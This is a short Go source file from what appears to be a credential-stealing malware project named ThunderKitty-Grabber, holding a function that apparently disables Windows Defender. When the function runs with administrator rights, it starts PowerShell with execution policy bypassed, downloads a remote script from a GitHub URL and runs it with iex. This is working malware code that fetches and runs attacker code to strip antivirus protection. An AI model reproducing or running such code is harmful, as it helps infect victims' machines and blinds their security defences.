package Defender

import (
	Persistence "ThunderKitty-Grabber/utils/persistence"
	"syscall"
	"unsafe"
)

func Disable() {
	if !Persistence.IsAdmin() {
		return
	}
	rizzma := `powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('https://raw.githubusercontent.com/EvilBytecode/ThunderKitty/main/powershellstuff/defenderstuff.ps1')|iex"`
	sigma, _ := syscall.UTF16PtrFromString(rizzma)

	var si syscall.StartupInfo
	var pi syscall.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	syscall.CreateProcess(nil, sigma, nil, nil, false, 0, nil, nil, &si, &pi)
	syscall.WaitForSingleObject(pi.Process, syscall.INFINITE)
	syscall.CloseHandle(pi.Process)
	syscall.CloseHandle(pi.Thread)
}
